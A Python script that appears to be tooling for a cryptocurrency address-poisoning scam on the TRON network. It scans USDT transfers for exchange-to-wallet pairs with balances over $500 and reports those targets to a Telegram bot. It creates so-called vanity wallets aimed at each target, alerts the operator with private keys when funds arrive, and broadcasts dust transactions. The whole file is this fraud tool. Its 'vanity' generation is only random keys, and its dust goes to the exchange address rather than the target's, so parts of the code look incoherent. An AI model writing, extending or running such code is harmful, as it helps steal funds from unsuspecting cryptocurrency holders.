import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timezone

print("🚀 Starting Strict Scanner (Full Addresses)...")

# =========================
#  STRICT RULES
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 500
MIN_TRANSFER_USD = 150
REQUIRED_TRANSFERS = 2

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
checked_receivers = set()
vanity_wallets = {}
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

send_telegram("🚀 <b>Strict Scanner Started</b>\nRules: Min $500 balance, Min $150 transfer, 2+ sends from CEX.")

# =========================
# MAIN SCANNING LOOP
# =========================
while len(found_pairs) < TARGET_PAIRS:
    print(f"\n🔄 Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
    
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"start": 0, "limit": 200, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        data = r.json()
        transfers = data.get("token_transfers", [])
        
        if not transfers:
            time.sleep(5)
            continue
        
        receivers = defaultdict(list)
        for tx in transfers:
            from_addr = tx.get("from_address")
            to_addr = tx.get("to_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            from_tag = tx.get("from_address_tag", {})
            
            if from_addr and to_addr and amount >= MIN_TRANSFER_USD:
                receivers[to_addr].append({"from": from_addr, "amount": amount, "tag": from_tag})
        
        for wallet_b, txs in receivers.items():
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_receivers: continue
            
            sender_counts = defaultdict(list)
            for tx in txs:
                sender_counts[tx["from"]].append(tx)
            
            for sender, sender_txs in sender_counts.items():
                if len(sender_txs) >= REQUIRED_TRANSFERS:
                    tag_name = sender_txs[0]["tag"].get("from_address_tag", "").lower() if sender_txs[0]["tag"] else ""
                    is_cex = any(keyword in tag_name for keyword in CEX_KEYWORDS)
                    cex_name = sender_txs[0]["tag"].get("from_address_tag", "Unknown") if sender_txs[0]["tag"] else "Unknown"
                    
                    if is_cex:
                        balance = get_usdt_balance(wallet_b)
                        print(f"Checking balance for {wallet_b}: ${balance}")
                        
                        if balance >= MIN_BALANCE_USD:
                            checked_receivers.add(wallet_b)
                            found_pairs.append({
                                "wallet_a": sender, "wallet_b": wallet_b,
                                "cex_name": cex_name, "amount": sender_txs[0]["amount"],
                                "balance": balance
                            })
                            
                            print(f"✅ Pair Found: {cex_name} -> {wallet_b} (Bal: ${balance})")
                            
                            # FIX: SHOWING FULL ADDRESSES NOW
                            send_telegram(
                                f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n\n"
                                f"🏦 <b>CEX ({cex_name}):</b>\n<code>{sender}</code>\n\n"
                                f" <b>Private Wallet:</b>\n<code>{wallet_b}</code>\n\n"
                                f"💰 Transfer: ${sender_txs[0]['amount']}\n💼 Balance: ${balance}"
                            )
                        else:
                            print(f"❌ Balance too low (${balance} < ${MIN_BALANCE_USD})")
                    break
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(5)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        time.sleep(10)

# =========================
# INTERACTIVE WAITING ROOM
# =========================
send_telegram(f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n\n<b>Commands:</b>\n• <b>info</b> - List full pairs\n• <b>vanity [ID] [Pair#]</b> - Create vanity wallet\n• <b>vanity [ID] alert</b> - Enable alerts\n• <b>vanity [ID]</b> - Check status\n• <b>transfer</b> - Execute")

start_wait = time.time()
last_id = 0

while True:
    if time.time() - start_wait > 600:
        print(" 10 minutes passed. Exiting.")
        send_telegram("⏰ <b>Session timed out.</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except:
        updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            parts = text.lower().split()
            
            # INFO COMMAND (FULL ADDRESSES)
            if parts[0] == "info":
                msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\n\n"
                for i, p in enumerate(found_pairs):
                    msg += f"<b>#{i+1} {p['cex_name']}</b>\n"
                    msg += f" <code>{p['wallet_a']}</code>\n"
                    msg += f" <code>{p['wallet_b']}</code>\n"
                    msg += f"💰 ${p['amount']} | 💼 Bal: ${p['balance']}\n\n"
                send_telegram(msg)
            
            # VANITY COMMANDS
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vanity_id = int(parts[1])
                    
                    # CREATE: vanity 280 1
                    if len(parts) == 3 and parts[2].isdigit():
                        pair_num = int(parts[2]) - 1
                        if 0 <= pair_num < len(found_pairs):
                            from tronpy.keys import PrivateKey
                            key = PrivateKey.random()
                            addr = key.public_key.to_base58check_address()
                            
                            vanity_wallets[vanity_id] = {
                                "address": addr, "private_key": key.hex(),
                                "target_pair": pair_num + 1,
                                "target_wallet": found_pairs[pair_num]['wallet_b'],
                                "alert_active": False, "last_balance": 0,
                                "created_at": datetime.now(timezone.utc).isoformat()
                            }
                            
                            send_telegram(f"✅ <b>Vanity Wallet #{vanity_id} Created</b>\n\n<b>Address:</b> <code>{addr}</code>\n<b>Target:</b> Pair #{pair_num+1}\n<b>Type:</b> <code>vanity {vanity_id} alert</code> to enable alerts")
                        else:
                            send_telegram(f"❌ Invalid pair number. Use 1-{len(found_pairs)}")
                    
                    # ALERTS: vanity 280 alert
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vanity_id in vanity_wallets:
                            vanity_wallets[vanity_id]["alert_active"] = True
                            send_telegram(f"🔔 <b>Alerts Enabled for Vanity #{vanity_id}</b>\nAddress: <code>{vanity_wallets[vanity_id]['address']}</code>")
                        else:
                            send_telegram(f"❌ Vanity wallet #{vanity_id} not found.")
                    
                    # STATUS: vanity 280
                    elif len(parts) == 2:
                        if vanity_id in vanity_wallets:
                            v = vanity_wallets[vanity_id]
                            # Quick balance check
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                r_usdt = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}/trc20/balance", params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"}, headers=headers, timeout=10)
                                usdt_bal = int(r_usdt.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_usdt.json().get("data") else 0
                            except:
                                trx_bal, usdt_bal = 0, 0
                            
                            if trx_bal > v["last_balance"] and v["alert_active"]:
                                send_telegram(f"🚨 <b>ALERT: Vanity #{vanity_id} Received Funds!</b>\nTRX: {trx_bal} | USDT: ${usdt_bal}\n<b>Private Key:</b> <code>{v['private_key']}</code>")
                                v["last_balance"] = trx_bal
                            
                            msg = f"📊 <b>Vanity Wallet #{vanity_id}</b>\n\n"
                            msg += f"<b>Address:</b> <code>{v['address']}</code>\n"
                            msg += f"<b>Private Key:</b> <code>{v['private_key']}</code>\n"
                            msg += f"<b>Target Pair:</b> #{v['target_pair']}\n"
                            msg += f"<b>TRX:</b> {trx_bal:.6f} | <b>USDT:</b> ${usdt_bal:.2f}\n"
                            msg += f"<b>Alerts:</b> {'🔔 ON' if v['alert_active'] else '🔕 OFF'}"
                            send_telegram(msg)
                        else:
                            send_telegram(f"❌ Vanity wallet #{vanity_id} not found.")
                
                except ValueError:
                    send_telegram("❌ Invalid vanity ID.")
                except Exception as e:
                    send_telegram(f"❌ Error: {e}")
            
            # LIST VANITIES
            elif text.lower() == "vanity list":
                if not vanity_wallets:
                    send_telegram(" No vanity wallets created yet.")
                else:
                    msg = "📋 <b>All Vanity Wallets</b>\n\n"
                    for vid, v in vanity_wallets.items():
                        msg += f"<b>#{vid}</b>: <code>{v['address']}</code> | Pair #{v['target_pair']} | {'🔔' if v['alert_active'] else '🔕'}\n\n"
                    send_telegram(msg)
            
            # TRANSFER
            elif parts[0] == "transfer":
                if not found_pairs:
                    send_telegram("❌ No pairs to transfer!")
                else:
                    send_telegram(" <b>Starting transfers...</b>")
                    try:
                        from tronpy import Tron
                        from tronpy.keys import PrivateKey
                        
                        tron = Tron()
                        priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                        main_addr = priv.public_key.to_base58check_address()
                        
                        for i, pair in enumerate(found_pairs):
                            pair_num = i + 1
                            v_key = None
                            for vid, v in vanity_wallets.items():
                                if v["target_pair"] == pair_num:
                                    v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                    v_addr = v['address']
                                    break
                            
                            if not v_key:
                                v_key = PrivateKey.random()
                                v_addr = v_key.public_key.to_base58check_address()
                            
                            tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                            time.sleep(3)
                            tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                            
                            send_telegram(f"✅ <b>Pair #{pair_num} Done</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
                            time.sleep(5)
                            
                        send_telegram("✅ <b>All transfers completed!</b>")
                    except Exception as e:
                        send_telegram(f"❌ Transfer Error: {e}")
                    break

    time.sleep(5)

print("✅ Workflow finished.")
